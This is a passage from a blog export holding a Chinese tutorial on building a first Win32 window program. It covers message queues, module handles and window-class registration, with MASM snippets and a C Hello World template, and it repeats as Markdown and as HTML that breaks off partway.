\n\n一个窗口不一定就是一个程序，它可能只是程序的一部分，一个程序可以有多个顶层窗口，一个顶层窗口又可以有多个子窗口，子窗口又可以有子窗口。\n\n程序也不一定是窗口，如果一个程序不需要与用户进行交互，那么他可以不建立窗口。\n\nDOS程序是过程驱动的。窗口程序是事件驱动的。\n\n<!-- more -->\n\n![](06-win32编程基础Chapter-6\\Image.png)\n\n#### 0x01 消息队列\n\nWindows在系统内部有一个系统队列，当输入设备有所动作（键盘输入、鼠标移动/点击等），Winodws会产生相应的记录并放到系统消息队列中。同时，Windows还会为每个窗口程序（严格说是每个线程）维护一个消息队列。\n\n![](06-win32编程基础Chapter-6\\Image [2].png)\n\n#### 0x02 模块与句柄\n\n模块：\n\n> 一个运行中的.exe或dll就是一个模块，包括代码和所有资源。即在硬盘上的文件不能称为模块，加载到内存后才能称为模块。dll被不同程序加载到内存就产生了不同模块，以隔离地址空间。\n\n句柄：\n\n> 为了能够区分不同模块，因此产生了句柄用来唯一标识每个模块。句柄只是一个数值，它对程序是没意义的，它只是Windows用来区分不同资源的编号，以便Window能够区分和使用。\n\n简单来说：\n\n> Windows为每个窗口、dll等都各分配一个句柄，并记录窗口、dll等与句柄的对应关系。\n>\n> Windows将句柄给程序，程序操作句柄等同于操作窗口。\n>\n> Windows也可以通过我们传入的句柄知道程序要操作的窗口。\n>\n> Windows上几乎所有东西都用句柄标识：文件句柄、窗口句柄、模块句柄、线程句柄等。\n\n获取句柄：\n\n> 在Win32中，模块句柄数值上等于程序装入内存的起始地址。\n\n可以用API函数GetModuleHandle获取模块的句柄：\n\n```assembly\ninvoke GetModuleHandle,lpModuleName  ;lpModuleName参数是指向模块名称字符串地址的指针。\n```\n\nPS：如果lpModuleName参数使用NULL，返回得到的是调用者自身的本模块句柄。为了便利会先把程序的句柄获取并放在全局变量保存。\n\nAPI函数返回值即模块的句柄，存储在EAX中。 \n\n  \n\n#### 0x03 窗口程序\n\n1.一个程序的结构流程：\n\n> 得到应用程序的句柄（GetModuleHandle）\n>\n> 注册窗口类(RegisterClassEx) \n>\n> 建立窗口（CreateWindowEx） \n>\n> 显示窗口（ShowWindows） \n>\n> 刷新窗口客户区（UpdateWindow） \n>\n> 进入无限的消息获取和处理的循环：\n>\n> - 获得消息（GetMessage）\n> - 消息处理（TranslateMessage ）\n> - 分派消息（DispatchMessage）\n\n2.注册窗口类：\n\n> 建立窗口类的方法是在系统中注册，注册窗口类的API函数是 `RegisterClassEx`，最后的“Ex”是扩展的意思，因为它是 Win16 中`RegisterClass`的扩展。\n\n一个窗口类定义了窗口的一些主要属性，如：图标、光标、背景色、菜单和负责处理所属该窗口消息的函数。这些属性并不是分成多个参数传递过去的（这种做法不聪明），而是定义在一个`WNDCLASSEX`结构中，再把结构的地址当参数一次性传递给 `RegisterClassEx`。\n\nWNDCLASSEX结构定义：\n\n```assembly\nWNDCLASSEX STRUCT \n\nCbSize         DWORD   ?  ;结构的字节数\nStyle          DWORD   ?  ;类风格  \nLpfnWndProc    DWORD   ?  **;窗口过程的地址,****回调函数的地址。**\nCbClsExtra     DWORD   ?  \nCbWndExtra     DWORD   ?  \nHInstance      DWORD   ?  ;**指定窗口类属于的模块，传入模块的句柄。**  \nHIcon          DWORD   ?  ;窗口左上角的图标  \nHCursor        DWORD   ?  ;窗口光标  \nHbrBackground  DWORD   ?  ;窗口客户区的背景色  \nLpszMenuName   DWORD   ?  ;窗口菜单  \nLpszClassName  DWORD   ?  **;要注册的类的字符串名字，指向类名字符串地址的指针。**  \nHIconSm        DWORD   ?  ;小图标 \n\nWNDCLASSEX ENDS\n```\n\n- LpfnWndProc\n\n> 基于这个类创建的窗口都使用该回调函数，即一个窗口过程可以服务多个窗口，只要它们是由同一个窗口类创建的。\n>\n> Windows运行到DispatchMessage函数时，会把消息传给该过程函数。\n\n注册窗口类：\n\n```assembly\nlocal   stWndClass:WNDCLASSEX             ;以WNDCLASSEX结构为类型定义一个结构。\ninvoke  RegisterClassEx,addr stWndClass   ;调用注册函数进行窗口类注册\n```\n\n3.建立窗口：\n\n> 利用上一步注册的窗口类为基础（模板）来创建一个窗口。\n\n和注册窗口类时用一个结构传递所有参数不同，建立窗口时所有的属性都是用单个参数的方式传递的，建立窗口的API函数是`CreateWindowEx`。  \n\n建立窗口：\n\n```assembly\ninvoke   CreateWindowEx, dwExStyle, lpClassName,lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance,lpParam\n```\n\n参数解析：\n\n- `lpClassName`：传入上一步注册的类的字符串名称。表示使用该类为模板创建窗口，会继承窗口类的属性以及使用窗口类指定的窗口过程。 \n- `lpWindowName`：窗口的标题。指向窗口标题字符串地址的指针。 \n- `hInstance`：窗口所属的模块的句柄。\n- `dwExStyle、dwStyle`：窗口的两个参数 dwStyle 和 dwExStyle 决定了窗口的外形和行为，们是一些以WS（Windows Style的缩写）为开头的预定义值，具体查文档。\n- `x, y`：指定窗口左上角位置，单位是像素（px）。即窗口的位置。\n- `nWidth、nHeight`：窗口的宽度和高度，也就是窗口的大小，同样是以像素为单位的。\n\nCreateWindowEx 建立窗口以后，eax 中传回来的是窗口句柄，注意要把它先保存起来，因为这时候，窗口虽已建立，但还没有在屏幕上显示出来。\n\n4.显示窗口：\n\n> `ShowWindow`用于显示上一步创建的窗口，该函数有两个参数，第一个参数是要显示的窗口的句柄，第二个参数是显示的方式，显示的方式是众多预定义的值，具体定义查文档。\n\n5.绘制窗口：\n\n> 窗口显示以后，用 `UpdateWindow` 绘制客户区，它实际上就是向窗口发送了一条 `WM_PAINT` 消息。到此为止，一个顶层窗口才算正常建立并显示！ \n\n绘制窗口，传入要绘制的窗口的句柄：\n\n```assembly\ninvoke UpdateWindow,hxxxx\n```\n\n6.消息循环：\n\n消息循环中的几个函数要用到一个MSG结构，用来做消息传递：\n\n```assembly\nMSG STRUCT  \n\nHwnd      DWORD     ?   ;消息要发向的窗口的句柄。\nMessage   DWORD     ?   ;消息标识符，在头文件中以WM_开头的预定义值。\nWParam    DWORD     ?   ;消息的参数之一。\nLParam    DWORD     ?   ;消息的参数之二。\nTime      DWORD     ?   ;消息放入消息队列的时间。\nPt        POINT     <>  ;这是一个POINT数据结构，表示消息放入消息队列时的鼠标坐标。\n\nMSG ENDS\n```\n\n获取消息：\n\n> `GetMessage` 函数从消息队列里取得消息，用取得的消息填写到传入的MSG结构。\n\n```assembly\ninvoke  GetMessage, lpMsg, hWnd, wMsgFilterMin,wMsgFilterMax ;\n```\n\n参数解析：\n\n- lpMsg：指向一个MSG结构，函数取到的消息填写MSG后返回。\n- hWnd：传入要获取消息的的窗口句柄。指定为NULL表示获取所有本程序的窗口的消息。\n- wMsgFilterMin 和wMsgFilterMax 为0表示获取所有编号的消息。\n\n`TranslateMessage`的作用是遇到键盘消息则将扫描码转换成ASCII码并在消息队列中插入`WM_CHAR` 或` WM_SYSCHAR `消息，参数就是转换好的ASCII码。   \n\n最后，由 `DispatchMessage` 将消息（`GetMessage`填写好的MSG结构）发送到窗口对应的窗口过程去处理。\n\n窗口过程返回后 `DispatchMessage` 函数才返回，然后开始新一轮消息循环。\n\n\n\n#### 0x04 Win窗口程序编写模板\n\n该模板是用C调用API函数编写的。\n\n```c\n#include <windows.h>\n\nLRESULT CALLBACK WindowProc(HWND hwhd,UINT,WPARAM wParam,LPARAM IParam);   //回调函数（过程函数）原型。\n\nint WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPreInstance,PSTR szCmdline,int iCmdShow )   //WinMain函数由系统调用。\n\n{\n     \\* ------------------------注册窗口类---------------------------------*\\\n\n     static TCHAR szAppName[] = TEXT(\"MyWindows\");     //声明并初始化一个字符串，用作注册的窗口类的名称\n     \n     WNDCLASS wndclass;                          //以WNDCLASS结构为模板，声明一个结构名为wndclass的结构。\n     wndclass.style = CS_HREDRAW | CS_VREDRAW;\n     wndclass.lpfnWndProc = WindowProc;          //指明回调函数名称（函数名本质是地址，因此是指针）。\n     wndclass.cbClsExtra = 0;\n     wndclass.cbWndExtra = 0;\n     wndclass.hInstance = hInstance;             //程序当前实例的句柄，由WinMain函数传入。\n     wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);              //图标\n     wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);                //光标\n     wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);  //窗口背景色\n     wndclass.lpszMenuName = NULL;                                  //窗口菜单\n     wndclass.lpszClassName = szAppName;     //注册的窗口类的字符串名称。（要求指针，因此是字符串的地址）\n\n     RegisterClass(&wndclass);     //注册窗口类，类的信息定义在WNDCLASS结构中。传入结构的地址作为参数。\n\n     \n     \\* ------------------------创建窗口---------------------------------*\\\n\n     HWND hwnd;     //声明一个句柄结构类型的变量。(通常声明于WinMain函数内部顶部，此处为了方便观看)\n\n     //根据窗口类创建窗口，并返回窗口的句柄。\n     hwnd = CreateWindow( szAppName,                  //上一步中注册的类的名称（字符串地址）。\n                         TEXT(\"MyWindow\"),           //窗口的标题（字符串地址）。\n                         WS_OVERLAPPEDWINDOW,\n                         CW_USEDEFAULT,\n                         CW_USEDEFAULT,\n                         CW_USEDEFAULT,\n                         CW_USEDEFAULT,\n                         NULL,\n                         NULL,\n                         hInstance,                  //程序当前实例的句柄，由WinMain函数传入。\n                         NULL);\n\n\n     \\* ------------------------显示、绘制窗口---------------------------------*/\n\n     ShowWindow(hwnd,iCmdShow);      //传入要显示的窗口的句柄。\n     UpdateWindow(hwnd);             //传入要绘制的窗口句柄，实际上就是向窗口发送了一条 WM_PAINT 消息。\n\n     \\* ------------------------消息处理---------------------------------*/\n\n     MSG msg;        //一个MSG结构为类型，声明一个结构名为msg的结构。\n     \n     while(GetMessage(&msg,NULL,0,0))    //传入的时msg结构的地址，因此三个函数操作的都是同一的对象。\n     {\n         TranslateMessage(&msg);\n         DispatchMessage(&msg);          //将消息分发给回调函数WindowProc**\n\n     }\n\n     return msg.wParam;  //当接收到一个WM_QUIT消息时，程序就中止。并且返回传递给WM_QUIT消息的wParam参数的值。\n\n}\n\n\n\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)  //回调函数定义\n\n{\n\n    HDC hdc;\n    PAINTSTRUCT ps;\n    RECT rect;\n\n    switch (message)\n    {\n       case WM_PAINT:\n           hdc = BeginPaint(hwnd, &ps);\n           GetClientRect(hwnd, &rect);\n           DrawText(hdc, TEXT(\"Hello World!\"), -1, &rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);\n           EndPaint(hwnd, &ps);\n           return 0;\n            \n       case WM_DESTROY:\n           PostQuitMessage(0);\n           return 0;\n    }\n\n    return DefWindowProc(hwnd, message, wParam, lParam); //若消息没有匹配到上面，默认执行该操作。\n\n}\n```\n\n\n\n","source":"_posts/06-win32编程基础Chapter-6.md","raw":"---\ntitle: Win32编程基础Chapter 6：第一个窗口程序\ndate: 2019-04-02 09:26:59\ntags:\n\t- Win32\n\t- 汇编语言\ncategories: Win32\n---\n\n#### 0x00 程序与窗口的关系 \n\n一个窗口不一定就是一个程序，它可能只是程序的一部分，一个程序可以有多个顶层窗口，一个顶层窗口又可以有多个子窗口，子窗口又可以有子窗口。\n\n程序也不一定是窗口，如果一个程序不需要与用户进行交互，那么他可以不建立窗口。\n\nDOS程序是过程驱动的。窗口程序是事件驱动的。\n\n<!-- more -->\n\n![](06-win32编程基础Chapter-6\\Image.png)\n\n#### 0x01 消息队列\n\nWindows在系统内部有一个系统队列，当输入设备有所动作（键盘输入、鼠标移动/点击等），Winodws会产生相应的记录并放到系统消息队列中。同时，Windows还会为每个窗口程序（严格说是每个线程）维护一个消息队列。\n\n![](06-win32编程基础Chapter-6\\Image [2].png)\n\n#### 0x02 模块与句柄\n\n模块：\n\n> 一个运行中的.exe或dll就是一个模块，包括代码和所有资源。即在硬盘上的文件不能称为模块，加载到内存后才能称为模块。dll被不同程序加载到内存就产生了不同模块，以隔离地址空间。\n\n句柄：\n\n> 为了能够区分不同模块，因此产生了句柄用来唯一标识每个模块。句柄只是一个数值，它对程序是没意义的，它只是Windows用来区分不同资源的编号，以便Window能够区分和使用。\n\n简单来说：\n\n> Windows为每个窗口、dll等都各分配一个句柄，并记录窗口、dll等与句柄的对应关系。\n>\n> Windows将句柄给程序，程序操作句柄等同于操作窗口。\n>\n> Windows也可以通过我们传入的句柄知道程序要操作的窗口。\n>\n> Windows上几乎所有东西都用句柄标识：文件句柄、窗口句柄、模块句柄、线程句柄等。\n\n获取句柄：\n\n> 在Win32中，模块句柄数值上等于程序装入内存的起始地址。\n\n可以用API函数GetModuleHandle获取模块的句柄：\n\n```assembly\ninvoke GetModuleHandle,lpModuleName  ;lpModuleName参数是指向模块名称字符串地址的指针。\n```\n\nPS：如果lpModuleName参数使用NULL，返回得到的是调用者自身的本模块句柄。为了便利会先把程序的句柄获取并放在全局变量保存。\n\nAPI函数返回值即模块的句柄，存储在EAX中。 \n\n  \n\n#### 0x03 窗口程序\n\n1.一个程序的结构流程：\n\n> 得到应用程序的句柄（GetModuleHandle）\n>\n> 注册窗口类(RegisterClassEx) \n>\n> 建立窗口（CreateWindowEx） \n>\n> 显示窗口（ShowWindows） \n>\n> 刷新窗口客户区（UpdateWindow） \n>\n> 进入无限的消息获取和处理的循环：\n>\n> - 获得消息（GetMessage）\n> - 消息处理（TranslateMessage ）\n> - 分派消息（DispatchMessage）\n\n2.注册窗口类：\n\n> 建立窗口类的方法是在系统中注册，注册窗口类的API函数是 `RegisterClassEx`，最后的“Ex”是扩展的意思，因为它是 Win16 中`RegisterClass`的扩展。\n\n一个窗口类定义了窗口的一些主要属性，如：图标、光标、背景色、菜单和负责处理所属该窗口消息的函数。这些属性并不是分成多个参数传递过去的（这种做法不聪明），而是定义在一个`WNDCLASSEX`结构中，再把结构的地址当参数一次性传递给 `RegisterClassEx`。\n\nWNDCLASSEX结构定义：\n\n```assembly\nWNDCLASSEX STRUCT \n\nCbSize         DWORD   ?  ;结构的字节数\nStyle          DWORD   ?  ;类风格  \nLpfnWndProc    DWORD   ?  **;窗口过程的地址,****回调函数的地址。**\nCbClsExtra     DWORD   ?  \nCbWndExtra     DWORD   ?  \nHInstance      DWORD   ?  ;**指定窗口类属于的模块，传入模块的句柄。**  \nHIcon          DWORD   ?  ;窗口左上角的图标  \nHCursor        DWORD   ?  ;窗口光标  \nHbrBackground  DWORD   ?  ;窗口客户区的背景色  \nLpszMenuName   DWORD   ?  ;窗口菜单  \nLpszClassName  DWORD   ?  **;要注册的类的字符串名字，指向类名字符串地址的指针。**  \nHIconSm        DWORD   ?  ;小图标 \n\nWNDCLASSEX ENDS\n```\n\n- LpfnWndProc\n\n> 基于这个类创建的窗口都使用该回调函数，即一个窗口过程可以服务多个窗口，只要它们是由同一个窗口类创建的。\n>\n> Windows运行到DispatchMessage函数时，会把消息传给该过程函数。\n\n注册窗口类：\n\n```assembly\nlocal   stWndClass:WNDCLASSEX             ;以WNDCLASSEX结构为类型定义一个结构。\ninvoke  RegisterClassEx,addr stWndClass   ;调用注册函数进行窗口类注册\n```\n\n3.建立窗口：\n\n> 利用上一步注册的窗口类为基础（模板）来创建一个窗口。\n\n和注册窗口类时用一个结构传递所有参数不同，建立窗口时所有的属性都是用单个参数的方式传递的，建立窗口的API函数是`CreateWindowEx`。  \n\n建立窗口：\n\n```assembly\ninvoke   CreateWindowEx, dwExStyle, lpClassName,lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance,lpParam\n```\n\n参数解析：\n\n- `lpClassName`：传入上一步注册的类的字符串名称。表示使用该类为模板创建窗口，会继承窗口类的属性以及使用窗口类指定的窗口过程。 \n- `lpWindowName`：窗口的标题。指向窗口标题字符串地址的指针。 \n- `hInstance`：窗口所属的模块的句柄。\n- `dwExStyle、dwStyle`：窗口的两个参数 dwStyle 和 dwExStyle 决定了窗口的外形和行为，们是一些以WS（Windows Style的缩写）为开头的预定义值，具体查文档。\n- `x, y`：指定窗口左上角位置，单位是像素（px）。即窗口的位置。\n- `nWidth、nHeight`：窗口的宽度和高度，也就是窗口的大小，同样是以像素为单位的。\n\nCreateWindowEx 建立窗口以后，eax 中传回来的是窗口句柄，注意要把它先保存起来，因为这时候，窗口虽已建立，但还没有在屏幕上显示出来。\n\n4.显示窗口：\n\n> `ShowWindow`用于显示上一步创建的窗口，该函数有两个参数，第一个参数是要显示的窗口的句柄，第二个参数是显示的方式，显示的方式是众多预定义的值，具体定义查文档。\n\n5.绘制窗口：\n\n> 窗口显示以后，用 `UpdateWindow` 绘制客户区，它实际上就是向窗口发送了一条 `WM_PAINT` 消息。到此为止，一个顶层窗口才算正常建立并显示！ \n\n绘制窗口，传入要绘制的窗口的句柄：\n\n```assembly\ninvoke UpdateWindow,hxxxx\n```\n\n6.消息循环：\n\n消息循环中的几个函数要用到一个MSG结构，用来做消息传递：\n\n```assembly\nMSG STRUCT  \n\nHwnd      DWORD     ?   ;消息要发向的窗口的句柄。\nMessage   DWORD     ?   ;消息标识符，在头文件中以WM_开头的预定义值。\nWParam    DWORD     ?   ;消息的参数之一。\nLParam    DWORD     ?   ;消息的参数之二。\nTime      DWORD     ?   ;消息放入消息队列的时间。\nPt        POINT     <>  ;这是一个POINT数据结构，表示消息放入消息队列时的鼠标坐标。\n\nMSG ENDS\n```\n\n获取消息：\n\n> `GetMessage` 函数从消息队列里取得消息，用取得的消息填写到传入的MSG结构。\n\n```assembly\ninvoke  GetMessage, lpMsg, hWnd, wMsgFilterMin,wMsgFilterMax ;\n```\n\n参数解析：\n\n- lpMsg：指向一个MSG结构，函数取到的消息填写MSG后返回。\n- hWnd：传入要获取消息的的窗口句柄。指定为NULL表示获取所有本程序的窗口的消息。\n- wMsgFilterMin 和wMsgFilterMax 为0表示获取所有编号的消息。\n\n`TranslateMessage`的作用是遇到键盘消息则将扫描码转换成ASCII码并在消息队列中插入`WM_CHAR` 或` WM_SYSCHAR `消息，参数就是转换好的ASCII码。   \n\n最后，由 `DispatchMessage` 将消息（`GetMessage`填写好的MSG结构）发送到窗口对应的窗口过程去处理。\n\n窗口过程返回后 `DispatchMessage` 函数才返回，然后开始新一轮消息循环。\n\n\n\n#### 0x04 Win窗口程序编写模板\n\n该模板是用C调用API函数编写的。\n\n```c\n#include <windows.h>\n\nLRESULT CALLBACK WindowProc(HWND hwhd,UINT,WPARAM wParam,LPARAM IParam);   //回调函数（过程函数）原型。\n\nint WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPreInstance,PSTR szCmdline,int iCmdShow )   //WinMain函数由系统调用。\n\n{\n     \\* ------------------------注册窗口类---------------------------------*\\\n\n     static TCHAR szAppName[] = TEXT(\"MyWindows\");     //声明并初始化一个字符串，用作注册的窗口类的名称\n     \n     WNDCLASS wndclass;                          //以WNDCLASS结构为模板，声明一个结构名为wndclass的结构。\n     wndclass.style = CS_HREDRAW | CS_VREDRAW;\n     wndclass.lpfnWndProc = WindowProc;          //指明回调函数名称（函数名本质是地址，因此是指针）。\n     wndclass.cbClsExtra = 0;\n     wndclass.cbWndExtra = 0;\n     wndclass.hInstance = hInstance;             //程序当前实例的句柄，由WinMain函数传入。\n     wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);              //图标\n     wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);                //光标\n     wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);  //窗口背景色\n     wndclass.lpszMenuName = NULL;                                  //窗口菜单\n     wndclass.lpszClassName = szAppName;     //注册的窗口类的字符串名称。（要求指针，因此是字符串的地址）\n\n     RegisterClass(&wndclass);     //注册窗口类，类的信息定义在WNDCLASS结构中。传入结构的地址作为参数。\n\n     \n     \\* ------------------------创建窗口---------------------------------*\\\n\n     HWND hwnd;     //声明一个句柄结构类型的变量。(通常声明于WinMain函数内部顶部，此处为了方便观看)\n\n     //根据窗口类创建窗口，并返回窗口的句柄。\n     hwnd = CreateWindow( szAppName,                  //上一步中注册的类的名称（字符串地址）。\n                         TEXT(\"MyWindow\"),           //窗口的标题（字符串地址）。\n                         WS_OVERLAPPEDWINDOW,\n                         CW_USEDEFAULT,\n                         CW_USEDEFAULT,\n                         CW_USEDEFAULT,\n                         CW_USEDEFAULT,\n                         NULL,\n                         NULL,\n                         hInstance,                  //程序当前实例的句柄，由WinMain函数传入。\n                         NULL);\n\n\n     \\* ------------------------显示、绘制窗口---------------------------------*/\n\n     ShowWindow(hwnd,iCmdShow);      //传入要显示的窗口的句柄。\n     UpdateWindow(hwnd);             //传入要绘制的窗口句柄，实际上就是向窗口发送了一条 WM_PAINT 消息。\n\n     \\* ------------------------消息处理---------------------------------*/\n\n     MSG msg;        //一个MSG结构为类型，声明一个结构名为msg的结构。\n     \n     while(GetMessage(&msg,NULL,0,0))    //传入的时msg结构的地址，因此三个函数操作的都是同一的对象。\n     {\n         TranslateMessage(&msg);\n         DispatchMessage(&msg);          //将消息分发给回调函数WindowProc**\n\n     }\n\n     return msg.wParam;  //当接收到一个WM_QUIT消息时，程序就中止。并且返回传递给WM_QUIT消息的wParam参数的值。\n\n}\n\n\n\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)  //回调函数定义\n\n{\n\n    HDC hdc;\n    PAINTSTRUCT ps;\n    RECT rect;\n\n    switch (message)\n    {\n       case WM_PAINT:\n           hdc = BeginPaint(hwnd, &ps);\n           GetClientRect(hwnd, &rect);\n           DrawText(hdc, TEXT(\"Hello World!\"), -1, &rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);\n           EndPaint(hwnd, &ps);\n           return 0;\n            \n       case WM_DESTROY:\n           PostQuitMessage(0);\n           return 0;\n    }\n\n    return DefWindowProc(hwnd, message, wParam, lParam); //若消息没有匹配到上面，默认执行该操作。\n\n}\n```\n\n\n\n","slug":"06-win32编程基础Chapter-6","published":1,"updated":"2019-04-02T02:31:08.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83n1005z7or0n6zj4bxk","content":"<h4 id=\"0x00-程序与窗口的关系\"><a href=\"#0x00-程序与窗口的关系\" class=\"headerlink\" title=\"0x00 程序与窗口的关系\"></a>0x00 程序与窗口的关系</h4><p>一个窗口不一定就是一个程序，它可能只是程序的一部分，一个程序可以有多个顶层窗口，一个顶层窗口又可以有多个子窗口，子窗口又可以有子窗口。</p>\n<p>程序也不一定是窗口，如果一个程序不需要与用户进行交互，那么他可以不建立窗口。</p>\n<p>DOS程序是过程驱动的。窗口程序是事件驱动的。</p>\n<a id=\"more\"></a>\n<p><img src=\"/2019/04/02/06-win32编程基础Chapter-6/Image.png\" alt></p>\n<h4 id=\"0x01-消息队列\"><a href=\"#0x01-消息队列\" class=\"headerlink\" title=\"0x01 消息队列\"></a>0x01 消息队列</h4><p>Windows在系统内部有一个系统队列，当输入设备有所动作（键盘输入、鼠标移动/点击等），Winodws会产生相应的记录并放到系统消息队列中。同时，Windows还会为每个窗口程序（严格说是每个线程）维护一个消息队列。</p>\n<p><img src=\"/2019/04/02/06-win32编程基础Chapter-6/Image [2].png\" alt></p>\n<h4 id=\"0x02-模块与句柄\"><a href=\"#0x02-模块与句柄\" class=\"headerlink\" title=\"0x02 模块与句柄\"></a>0x02 模块与句柄</h4><p>模块：</p>\n<blockquote>\n<p>一个运行中的.exe或dll就是一个模块，包括代码和所有资源。即在硬盘上的文件不能称为模块，加载到内存后才能称为模块。dll被不同程序加载到内存就产生了不同模块，以隔离地址空间。</p>\n</blockquote>\n<p>句柄：</p>\n<blockquote>\n<p>为了能够区分不同模块，因此产生了句柄用来唯一标识每个模块。句柄只是一个数值，它对程序是没意义的，它只是Windows用来区分不同资源的编号，以便Window能够区分和使用。</p>\n</blockquote>\n<p>简单来说：</p>\n<blockquote>\n<p>Windows为每个窗口、dll等都各分配一个句柄，并记录窗口、dll等与句柄的对应关系。</p>\n<p>Windows将句柄给程序，程序操作句柄等同于操作窗口。</p>\n<p>Windows也可以通过我们传入的句柄知道程序要操作的窗口。</p>\n<p>Windows上几乎所有东西都用句柄标识：文件句柄、窗口句柄、模块句柄、线程句柄等。</p>\n</blockquote>\n<p>获取句柄：</p>\n<blockquote>\n<p>在Win32中，模块句柄数值上等于程序装入内存的起始地址。</p>\n</blockquote>\n<p>可以用API函数GetModuleHandle获取模块的句柄：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke GetModuleHandle,lpModuleName  ;lpModuleName参数是指向模块名称字符串地址的指针。</span><br></pre></td></tr></table></figure>\n<p>PS：如果lpModuleName参数使用NULL，返回得到的是调用者自身的本模块句柄。为了便利会先把程序的句柄获取并放在全局变量保存。</p>\n<p>API函数返回值即模块的句柄，存储在EAX中。 </p>\n<h4 id=\"0x03-窗口程序\"><a href=\"#0x03-窗口程序\" class=\"headerlink\" title=\"0x03 窗口程序\"></a>0x03 窗口程序</h4><p>1.一个程序的结构流程：</p>\n<blockquote>\n<p>得到应用程序的句柄（GetModuleHandle）</p>\n<p>注册窗口类(RegisterClassEx) </p>\n<p>建立窗口（CreateWindowEx） </p>\n<p>显示窗口（ShowWindows） </p>\n<p>刷新窗口客户区（UpdateWindow） </p>\n<p>进入无限的消息获取和处理的循环：</p>\n<ul>\n<li>获得消息（GetMessage）</li>\n<li>消息处理（TranslateMessage ）</li>\n<li>分派消息（DispatchMessage）</li>\n</ul>\n</blockquote>\n<p>2.注册窗口类：</p>\n<blockquote>\n<p>建立窗口类的方法是在系统中注册，注册窗口类的API函数是 <code>RegisterClassEx</code>，最后的“Ex”是扩展的意思，因为它是 Win16 中<code>RegisterClass</code>的扩展。</p>\n</blockquote>\n<p>一个窗口类定义了窗口的一些主要属性，如：图标、光标、背景色、菜单和负责处理所属该窗口消息的函数。这些属性并不是分成多个参数传递过去的（这种做法不聪明），而是定义在一个<code>WNDCLASSEX</code>结构中，再把结构的地址当参数一次性传递给 <code>RegisterClassEx</code>。</p>\n<p>WNDCLASSEX结构定义：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WNDCLASSEX STRUCT </span><br><span class=\"line\"></span><br><span class=\"line\">CbSize         DWORD   ?  ;结构的字节数</span><br><span class=\"line\">Style          DWORD   ?  ;类风格  </span><br><span class=\"line\">LpfnWndProc    DWORD   ?  **;窗口过程的地址,****回调函数的地址。**</span><br><span class=\"line\">CbClsExtra     DWORD   ?  </span><br><span class=\"line\">CbWndExtra     DWORD   ?  </span><br><span class=\"line\">HInstance      DWORD   ?  ;**指定窗口类属于的模块，传入模块的句柄。**  </span><br><span class=\"line\">HIcon          DWORD   ?  ;窗口左上角的图标  </span><br><span class=\"line\">HCursor        DWORD   ?  ;窗口光标  </span><br><span class=\"line\">HbrBackground  DWORD   ?  ;窗口客户区的背景色  </span><br><span class=\"line\">LpszMenuName   DWORD   ?  ;窗口菜单  </span><br><span class=\"line\">LpszClassName  DWORD   ?  **;要注册的类的字符串名字，指向类名字符串地址的指针。**  </span><br><span class=\"line\">HIconSm        DWORD   ?  ;小图标 </span><br><span class=\"line\"></span><br><span class=\"line\">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure>\n<ul>\n<li>LpfnWndProc</li>\n</ul>\n<blockquote>\n<p>基于这个类创建的窗口都使用该回调函数，即一个窗口过程可以服务多个窗口，只要它们是由同一个窗口类创建的。</p>\n<p>Windows运行到DispatchMessage函数时，会把消息传给该过程函数。</p>\n</blockquote>\n<p>注册窗口类：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local   stWndClass:WNDCLASSEX             ;以WNDCLASSEX结构为类型定义一个结构。</span><br><span class=\"line\">invoke  RegisterClassEx,addr stWndClass   ;调用注册函数进行窗口类注册</span><br></pre></td></tr></table></figure>\n<p>3.建立窗口：</p>\n<blockquote>\n<p>利用上一步注册的窗口类为基础（模板）来创建一个窗口。</p>\n</blockquote>\n<p>和注册窗口类时用一个结构传递所有参数不同，建立窗口时所有的属性都是用单个参数的方式传递的，建立窗口的API函数是<code>CreateWindowEx</code>。  </p>\n<p>建立窗口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke   CreateWindowEx, dwExStyle, lpClassName,lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance,lpParam</span><br></pre></td></tr></table></figure>\n<p>参数解析：</p>\n<ul>\n<li><code>lpClassName</code>：传入上一步注册的类的字符串名称。表示使用该类为模板创建窗口，会继承窗口类的属性以及使用窗口类指定的窗口过程。 </li>\n<li><code>lpWindowName</code>：窗口的标题。指向窗口标题字符串地址的指针。 </li>\n<li><code>hInstance</code>：窗口所属的模块的句柄。</li>\n<li><code>dwExStyle、dwStyle</code>：窗口的两个参数 dwStyle 和 dwExStyle 决定了窗口的外形和行为，们是一些以WS（Windows Style的缩写）为开头的预定义值，具体查文档。</li>\n<li><code>x, 